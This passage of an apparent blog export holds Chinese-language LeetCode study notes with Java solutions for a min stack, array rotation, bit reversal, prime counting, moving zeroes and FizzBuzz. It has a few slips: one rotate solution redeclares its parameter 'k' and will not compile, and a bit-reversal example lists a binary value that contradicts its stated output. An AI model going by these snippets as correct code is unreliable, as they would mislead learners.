<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Stack&lt;Integer&gt; data;</span><br><span class="line">	<span class="keyword">private</span> Stack&lt;Integer&gt; helper;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MinStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		data = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">		helper = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		data.add(x);</span><br><span class="line">		<span class="keyword">if</span> (helper.isEmpty() || helper.peek() &gt;= x) &#123;</span><br><span class="line">			helper.add(x);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!data.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">int</span> top = data.pop();</span><br><span class="line">			<span class="keyword">if</span> (top == helper.peek()) &#123;</span><br><span class="line">				helper.pop();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!data.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">return</span> data.peek();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"栈中元素为空，此操作非法"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!helper.isEmpty()) &#123;</span><br><span class="line">			<span class="keyword">return</span> helper.peek();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"栈中元素为空，此操作非法"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>在遇到比min更小的值时，才把min入栈</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">	Stack&lt;Integer&gt; stack = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// only push the old minimum value when the current</span></span><br><span class="line">		<span class="comment">// minimum value changes after pushing the new value x</span></span><br><span class="line">		<span class="keyword">if</span> (x &lt;= min) &#123;</span><br><span class="line">			stack.push(min);</span><br><span class="line">			min = x;</span><br><span class="line">		&#125;</span><br><span class="line">		stack.push(x);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// if pop operation could result in the changing of the current minimum</span></span><br><span class="line">		<span class="comment">// value,</span></span><br><span class="line">		<span class="comment">// pop twice and change the current minimum value to the last minimum</span></span><br><span class="line">		<span class="comment">// value.</span></span><br><span class="line">		<span class="keyword">if</span> (stack.pop() == min)</span><br><span class="line">			min = stack.pop();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> stack.peek();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> min;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>189. 旋转数组</title>
    <url>/2020/03/26/LeetCode/leetcode-000189-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组，将数组中的元素向右移动 <em>k</em> 个位置，其中 <em>k</em> 是非负数。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>] 和 k = <span class="number">3</span></span><br><span class="line">输出: [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">解释:</span><br><span class="line">向右旋转 <span class="number">1</span> 步: [<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">向右旋转 <span class="number">2</span> 步: [<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">向右旋转 <span class="number">3</span> 步: [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: [-<span class="number">1</span>,-<span class="number">100</span>,<span class="number">3</span>,<span class="number">99</span>] 和 k = <span class="number">2</span></span><br><span class="line">输出: [<span class="number">3</span>,<span class="number">99</span>,-<span class="number">1</span>,-<span class="number">100</span>]</span><br><span class="line">解释: </span><br><span class="line">向右旋转 <span class="number">1</span> 步: [<span class="number">99</span>,-<span class="number">1</span>,-<span class="number">100</span>,<span class="number">3</span>]</span><br><span class="line">向右旋转 <span class="number">2</span> 步: [<span class="number">3</span>,<span class="number">99</span>,-<span class="number">1</span>,-<span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。</li>
<li>要求使用空间复杂度为 O(1) 的 <strong>原地</strong> 算法。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一：使用额外的数组-不符合题目要求"><a href="#解法一：使用额外的数组-不符合题目要求" class="headerlink" title="解法一：使用额外的数组(不符合题目要求)"></a>解法一：使用额外的数组(不符合题目要求)</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (nums.length &lt; <span class="number">2</span> || k &lt; <span class="number">1</span> || k % nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k &gt; nums.length) &#123;</span><br><span class="line">            k = k % nums.length;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span>[] newNums = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; k;i++) &#123;</span><br><span class="line">        	newNums[i] = nums[nums.length - k + i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = k,j = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	newNums[i] = nums[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">        	nums[i] = newNums[i];</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：暴力破解"><a href="#解法二：暴力破解" class="headerlink" title="解法二：暴力破解"></a>解法二：暴力破解</h3><p>每次旋转一个数字，旋转k个即可。这里有个坑，K的值是有可能比数组的长度大的，所以，在循环处理之前，需要对k取余。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> k = k % nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; k;i++) &#123;</span><br><span class="line">        	rotate(nums);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> temp = nums[nums.length - <span class="number">1</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = nums.length - <span class="number">1</span>;i &gt; <span class="number">0</span>;i--) &#123;</span><br><span class="line">			nums[i] = nums[i - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		nums[<span class="number">0</span>] = temp;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：翻转数组"><a href="#解法三：翻转数组" class="headerlink" title="解法三：翻转数组"></a>解法三：翻转数组</h3><p>假设对数组[1,2,3,4,5,6,7]，需要对k=3进行旋转。</p>
<p>那么我们先把这个数组翻转得到[7,6,5,4,3,2,1].</p>
<p>接着对前k个数字进行翻转，得到[5,6,7,4,3,2,1]</p>
<p>最后，对剩下的数字进行翻转，得到[5,6,7,1,2,3,4]</p>
<p>亦或是</p>
<p>先翻转前length - k 个，得到[4,3,2,1,5,6,7]</p>
<p>在翻转后k个，得到[4,3,2,1,7,6,5]</p>
<p>最后翻转整个数组，得到[5,6,7,1,2,3,4]</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.length &lt; <span class="number">2</span> || k &lt; <span class="number">1</span> || k % nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k &gt; nums.length) &#123;</span><br><span class="line">            k = k % nums.length;</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(nums, <span class="number">0</span>, nums.length - <span class="number">1</span> - k);</span><br><span class="line">        reverse(nums, nums.length - k, nums.length -<span class="number">1</span>);</span><br><span class="line">        reverse(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = nums[start];</span><br><span class="line">            nums[start++] = nums[end];</span><br><span class="line">            nums[end--] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法四："><a href="#解法四：" class="headerlink" title="解法四："></a>解法四：</h2><p>参考的<a href="https://leetcode-cn.com/problems/rotate-array/solution/xuan-zhuan-shu-zu-by-leetcode/" target="_blank" rel="noopener">LeetCode官方题解</a></p>
<p>如果我们直接把每一个数字放到它最后的位置，但这样的后果是遗失原来的元素。因此，我们需要把被替换的数字保存在变量 temptemptemp 里面。然后，我们将被替换数字（temptemptemp）放到它正确的位置，并继续这个过程 nnn 次， nnn 是数组的长度。这是因为我们需要将数组里所有的元素都移动。但是，这种方法可能会有个问题，如果 n%k==0n%k==0n%k==0，其中 k=k%nk=k%nk=k%n （因为如果 kkk 大于 nnn ，移动 kkk 次实际上相当于移动 k%nk%nk%n 次）。这种情况下，我们会发现在没有遍历所有数字的情况下回到出发数字。此时，我们应该从下一个数字开始再重复相同的过程。</p>
<p>现在，我们看看上面方法的证明。假设，数组里我们有 nnn 个元素并且 kkk 是要求移动的次数。更进一步，假设 n%k=0n%k=0n%k=0 。第一轮中，所有移动数字的下标 iii 满足 i%k==0i%k==0i%k==0 。这是因为我们每跳 kkk 步，我们只会到达相距为 kkk 个位置下标的数。每一轮，我们都会移动 nk\frac{n}{k}kn 个元素。下一轮中，我们会移动满足 i%k==1i%k==1i%k==1 的位置的数。这样的轮次会一直持续到我们再次遇到 i%k==0i%k==0i%k==0 的地方为止，此时 i=ki=ki=k 。此时在正确位置上的数字共有 k×nk=nk \times \frac{n}{k}=nk×kn=n 个。因此所有数字都在正确位置上。</p>
<p>让我们看一下接下来的例子，以更好地说明这个过程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">nums: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">k: <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://pic.leetcode-cn.com/f0493a97cdb7bc46b37306ca14e555451496f9f9c21effcad8517a81a26f30d6-image.png" alt></p>
<h4 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        k = k % nums.length;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> start = <span class="number">0</span>; count &lt; nums.length; start++) &#123;</span><br><span class="line">            <span class="keyword">int</span> current = start;</span><br><span class="line">            <span class="keyword">int</span> prev = nums[start];</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> next = (current + k) % nums.length;</span><br><span class="line">                <span class="keyword">int</span> temp = nums[next];</span><br><span class="line">                nums[next] = prev;</span><br><span class="line">                prev = temp;</span><br><span class="line">                current = next;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">while</span> (start != current);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>190. 颠倒二进制位</title>
    <url>/2020/03/26/LeetCode/leetcode-000190-%E9%A2%A0%E5%80%92%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>颠倒给定的 32 位无符号整数的二进制位。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 00000010100101000001111010011100</span><br><span class="line">输出: 00111001011110000010100101000000</span><br><span class="line">解释: 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596，</span><br><span class="line">      因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：<span class="number">11111111111111111111111111111101</span></span><br><span class="line">输出：<span class="number">10111111111111111111111111111111</span></span><br><span class="line">解释：输入的二进制串 <span class="number">11111111111111111111111111111101</span> 表示无符号整数 <span class="number">4294967293</span>，</span><br><span class="line">      因此返回 <span class="number">3221225471</span> 其二进制表示形式为 <span class="number">10101111110010110010011101101001</span>。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><p>请注意，在某些语言（如 Java）中，没有无符号整数类型。在这种情况下，输入和输出都将被指定为有符号整数类型，并且不应影响您的实现，因为无论整数是有符号的还是无符号的，其内部的二进制表示形式都是相同的。<br>在 Java 中，编译器使用二进制补码记法来表示有符号整数。因此，在上面的 示例 2 中，输入表示有符号整数 -3，输出表示有符号整数 -1073741825。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助StringBuilder，翻转字符串，不足32位的情况下，后面补0</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(Integer.toBinaryString(n)).reverse();</span><br><span class="line">        <span class="keyword">int</span> length = <span class="number">32</span> - sb.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            sb.append(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.parseUnsignedInt(sb.toString(), <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>依次将n的末尾位给result的末尾位，并且result向左移31次</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = n &amp; <span class="number">0x01</span>;</span><br><span class="line">            n = n &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            result = (result &lt;&lt; <span class="number">1</span>) | temp;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">31</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">            count = (n &gt;&gt;&gt; i &amp; <span class="number">1</span>) &lt;&lt; (<span class="number">31</span>-i) | count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/RBreeze/article/details/81393245" target="_blank" rel="noopener">LeetCode——第190题：颠倒二进制位</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>204. 计数质数</title>
    <url>/2020/03/26/LeetCode/leetcode-000204-%E8%AE%A1%E6%95%B0%E8%B4%A8%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>统计所有小于非负整数 <em>n</em> 的质数的数量。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: 4</span><br><span class="line">解释: 小于 10 的质数一共有 4 个, 它们是 2, 3, 5, 7 。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：筛法求素数"><a href="#解法一：筛法求素数" class="headerlink" title="解法一：筛法求素数"></a>解法一：筛法求素数</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countPrimes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">boolean</span>[] isPrim = <span class="keyword">new</span> <span class="keyword">boolean</span>[n];</span><br><span class="line">	    Arrays.fill(isPrim, <span class="keyword">true</span>);</span><br><span class="line">	    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i * i &lt; n; i++) </span><br><span class="line">	        <span class="keyword">if</span> (isPrim[i]) </span><br><span class="line">	            <span class="keyword">for</span> (<span class="keyword">int</span> j = i * i; j &lt; n; j += i) </span><br><span class="line">	                isPrim[j] = <span class="keyword">false</span>;</span><br><span class="line">	    </span><br><span class="line">	    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++)</span><br><span class="line">	        <span class="keyword">if</span> (isPrim[i]) count++;</span><br><span class="line">	    </span><br><span class="line">	    <span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>283. 移动零</title>
    <url>/2020/03/26/LeetCode/leetcode-000283-%E7%A7%BB%E5%8A%A8%E9%9B%B6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个数组 <code>nums</code>，编写一个函数将所有 <code>0</code> 移动到数组的末尾，同时保持非零元素的相对顺序。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [0,1,0,3,12]</span><br><span class="line">输出: [1,3,12,0,0]</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：快慢指针"><a href="#解法一：快慢指针" class="headerlink" title="解法一：快慢指针"></a>解法一：快慢指针</h3><p>使用快慢指针。i-慢指针指向数组首位，j-快指针遍历数组，遇到不为0的数据，就将该数据移到i处，i自增</p>
<p>最后将i-nums.length区间内的数据全置为0，即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[j] != <span class="number">0</span>) &#123;</span><br><span class="line">				nums[i++] = nums[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> (i &lt; nums.length) &#123;</span><br><span class="line">			nums[i++] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法二：快慢指针优化"><a href="#解法二：快慢指针优化" class="headerlink" title="解法二：快慢指针优化"></a>解法二：快慢指针优化</h2><p>在上一个解法中，遇到不为0的数据时不仅仅只移动一个位置，而是把两个位置交换，这样就可以略去i-nums.length的再次遍历了。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; nums.length;j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nums[j] != <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">int</span> temp = nums[j];</span><br><span class="line">				nums[j] = nums[i];</span><br><span class="line">				nums[i] = temp;</span><br><span class="line">				i++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>412. Fizz Buzz</title>
    <url>/2020/03/26/LeetCode/leetcode-000412.%20Fizz%20Buzz/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>写一个程序，输出从 1 到 n 数字的字符串表示。</p>
<ol>
<li><p>如果 n 是3的倍数，输出“Fizz”；</p>
</li>
<li><p>如果 n 是5的倍数，输出“Buzz”；</p>
</li>
</ol>
<p>3.如果 n 同时是3和5的倍数，输出 “FizzBuzz”。</p>
<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; 15,</span><br><span class="line"></span><br><span class="line">返回:</span><br><span class="line">[</span><br><span class="line">    &quot;1&quot;,</span><br><span class="line">    &quot;2&quot;,</span><br><span class="line">    &quot;Fizz&quot;,</span><br><span class="line">    &quot;4&quot;,</span><br><span class="line">    &quot;Buzz&quot;,</span><br><span class="line">    &quot;Fizz&quot;,</span><br><span class="line">    &quot;7&quot;,</span><br><span class="line">    &quot;8&quot;,</span><br><span class="line">    &quot;Fizz&quot;,</span><br><span class="line">    &quot;Buzz&quot;,</span><br><span class="line">    &quot;11&quot;,</span><br><span class="line">    &quot;Fizz&quot;,</span><br><span class="line">    &quot;13&quot;,</span><br><span class="line">    &quot;14&quot;,</span><br><span class="line">    &quot;FizzBuzz&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>无。注意3和15的公倍数，不要多输出即可。</p>
